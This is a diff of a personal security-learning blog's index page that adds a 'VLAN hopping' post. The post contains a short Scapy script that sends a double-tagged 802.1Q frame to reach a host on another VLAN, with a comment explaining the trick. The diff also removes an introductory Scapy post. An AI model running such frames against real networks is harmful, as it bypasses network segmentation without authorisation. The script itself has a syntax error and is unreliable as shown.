@@ -142,7 +142,7 @@
                 
                 <section class="switch-part switch-part2">
                     <div class="widget tagcloud" id="js-tagcloud">
-                        <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Google-Hack/" style="font-size: 10px;">Google Hack</a> <a href="/tags/Information-Gathering/" style="font-size: 10px;">Information Gathering</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Metasploit/" style="font-size: 13.33px;">Metasploit</a> <a href="/tags/Penetration-Testing/" style="font-size: 16.67px;">Penetration Testing</a> <a href="/tags/Python/" style="font-size: 16.67px;">Python</a> <a href="/tags/Understanding-Network-Hacks/" style="font-size: 20px;">Understanding Network Hacks</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/iOS学习/" style="font-size: 10px;">iOS学习</a> <a href="/tags/乱七八糟/" style="font-size: 10px;">乱七八糟</a> <a href="/tags/渗透测试/" style="font-size: 20px;">渗透测试</a>
+                        <a href="/tags/Attack/" style="font-size: 10px;">Attack</a> <a href="/tags/Google-Hack/" style="font-size: 10px;">Google Hack</a> <a href="/tags/Information-Gathering/" style="font-size: 10px;">Information Gathering</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Metasploit/" style="font-size: 12.5px;">Metasploit</a> <a href="/tags/Penetration-Testing/" style="font-size: 15px;">Penetration Testing</a> <a href="/tags/Python/" style="font-size: 15px;">Python</a> <a href="/tags/Understanding-Network-Hacks/" style="font-size: 20px;">Understanding Network Hacks</a> <a href="/tags/Web/" style="font-size: 10px;">Web</a> <a href="/tags/iOS学习/" style="font-size: 10px;">iOS学习</a> <a href="/tags/乱七八糟/" style="font-size: 10px;">乱七八糟</a> <a href="/tags/渗透测试/" style="font-size: 17.5px;">渗透测试</a>
                     </div>
                 </section>
                 
@@ -219,6 +219,64 @@
     </div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-VLAN-hopping" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/07/02/VLAN-hopping/" class="article-date">
+      <time datetime="2016-07-02T13:24:51.000Z" itemprop="datePublished">2016-07-02</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/07/02/VLAN-hopping/">VLAN hopping</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="string">''</span></span><br><span class="line">Lets say our computer <span class="keyword">is</span> connected to VLAN <span class="number">1</span> <span class="keyword">and</span> </span><br><span class="line">wants to ping another one on VLAN <span class="number">2.</span></span><br><span class="line"><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">packet = Ether(dst=<span class="string">"c0:d3:de:ad:be:ef"</span>) / Dot1Q(vlan=<span class="number">1</span>) / Dot1Q(vlan=<span class="number">2</span>) /IP(dst=<span class="string">"192.168.13.3"</span> / ICMP()</span><br><span class="line"></span><br><span class="line">sendp(packet)</span><br><span class="line"></span><br><span class="line"><span class="string">'''information</span><br><span class="line"></span><br><span class="line">First we set the header includeing our VLAN tag into the packet and afterwards</span><br><span class="line">the one of the destination host. The switch will remove the first tag, than decide</span><br><span class="line">how to react on the packet, seeing the second tag with VLAN id 2 he decides to forward</span><br><span class="line">it to that vlan. On some switches this attack will only be successful if its connected</span><br><span class="line">to other VLAN enabled switches via stacking, because otherwise they use port based VLAN.</span><br><span class="line">'''</span></span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
   
     <article id="post-MAC-Flooder" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -762,73 +820,6 @@
       
     <div class="article-tag tagcloud">
         <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/乱七八糟/">乱七八糟</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-Understanding-Network-Hacks-Scapy" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2016/06/12/Understanding-Network-Hacks-Scapy/" class="article-date">
-      <time datetime="2016-06-12T03:04:10.000Z" itemprop="datePublished">2016-06-12</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/06/12/Understanding-Network-Hacks-Scapy/">Understanding Network Hacks--Scapy</a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <h3 id="0x01-Scapy"><a href="#0x01-Scapy" class="headerlink" title="0x01 Scapy"></a>0x01 Scapy</h3><p>The default user on Kali linux is root. so we don’t need to use the command “sudo scapy”!<br>I tried once to set up the environment on OS X but eventually i just failed. It seems to<br>be the libdnet problem. I tried a lot of ways to fixed this probem. God damn it, i just<br>can’t fix it. if you can solve this problem pls let me know!</p>
-<p>alright. let’s get started with scapy</p>
-<h2 id="first-create-a-packet-using-scapy"><a href="#first-create-a-packet-using-scapy" class="headerlink" title="first. create a packet using scapy"></a>first. create a packet using scapy</h2><blockquote>
-<blockquote>
-<blockquote>
-<p>a=IP(ttl=10)<br>a<br>&lt; IP ttl=10 |&gt;<br>a.src<br>’127.0.0.1’<br>a.dst=”192.168.1.1”<br>a<br>&lt; IP ttl=10 dst=192.168.1.1 |&gt;<br>a.src<br>’192.168.8.14’<br>del(a.ttl)<br>a<br>&lt; IP dst=192.168.1.1 |&gt;<br>a.ttl<br>64</p>
-</blockquote>
-</blockquote>
-</blockquote>
-<p>as we can see the default ttl is 64.</p>
-<h2 id="stack-up-layers-according-to-the-OSI-model"><a href="#stack-up-layers-according-to-the-OSI-model" class="headerlink" title="stack up layers according to the OSI model"></a>stack up layers according to the OSI model</h2>
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Understanding-Network-Hacks/">Understanding Network Hacks</a></li></ul>
     </div>
 
       
